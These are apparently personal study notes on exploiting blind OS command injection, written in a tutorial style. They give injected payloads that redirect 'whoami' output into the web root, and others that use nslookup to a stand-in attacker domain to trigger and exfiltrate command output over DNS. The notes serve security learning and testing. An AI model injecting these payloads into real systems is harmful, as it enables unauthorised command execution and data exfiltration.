    # ----- Exploiting blind OS command injection by redirecting output
        - You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser.
        - Command:
            & whoami > <web_path_>file.txt &

    # ----- Exploiting blind OS command injection using out-of-band (OAST) techniques
        - You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
        - Command:
            & nslookup kgji2ohoyw.web-attacker.com &

        - The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
            & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
